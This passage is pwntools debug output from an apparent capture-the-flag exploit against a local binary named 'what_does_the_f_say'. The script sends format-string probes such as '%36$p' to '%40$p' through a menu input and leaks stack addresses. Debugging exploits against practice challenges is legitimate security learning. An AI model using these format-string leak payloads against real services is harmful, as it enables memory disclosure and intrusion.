+    b'You have less than 20 space rocks! Are you sure you want to buy it?\n'
+[DEBUG] Sent 0x2 bytes:
+    b'n\n'
+[DEBUG] Received 0x3b bytes:
+    b'\n'
+    b'Current space rocks: 14.49\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x6 bytes:
+    b'%36$p\n'
+[DEBUG] Received 0x57 bytes:
+    b'0xe1980a26c95a2ac\n'
+    b'\n'
+    b'You have less than 20 space rocks! Are you sure you want to buy it?\n'
+[DEBUG] Sent 0x2 bytes:
+    b'n\n'
+[DEBUG] Received 0x3b bytes:
+    b'\n'
+    b'Current space rocks: 14.49\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x6 bytes:
+    b'%37$p\n'
+[DEBUG] Received 0x57 bytes:
+    b'0xe1990e872bda2ac\n'
+    b'\n'
+    b'You have less than 20 space rocks! Are you sure you want to buy it?\n'
+[DEBUG] Sent 0x2 bytes:
+    b'n\n'
+[DEBUG] Received 0x3b bytes:
+    b'\n'
+    b'Current space rocks: 14.49\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x6 bytes:
+    b'%38$p\n'
+[DEBUG] Received 0x4b bytes:
+    b'(nil)\n'
+    b'\n'
+    b'You have less than 20 space rocks! Are you sure you want to buy it?\n'
+[DEBUG] Sent 0x2 bytes:
+    b'n\n'
+[DEBUG] Received 0x3b bytes:
+    b'\n'
+    b'Current space rocks: 14.49\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x6 bytes:
+    b'%39$p\n'
+[DEBUG] Received 0x4b bytes:
+    b'(nil)\n'
+    b'\n'
+    b'You have less than 20 space rocks! Are you sure you want to buy it?\n'
+[DEBUG] Sent 0x2 bytes:
+    b'n\n'
+[DEBUG] Received 0x3b bytes:
+    b'\n'
+    b'Current space rocks: 14.49\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x6 bytes:
+    b'%40$p\n'
+[DEBUG] Received 0x4b bytes:
+    b'(nil)\n'
+    b'\n'
+    b'You have less than 20 space rocks! Are you sure you want to buy it?\n'
+[DEBUG] Sent 0x2 bytes:
+    b'n\n'
+[*] Stopped process './what_does_the_f_say' (pid 625)
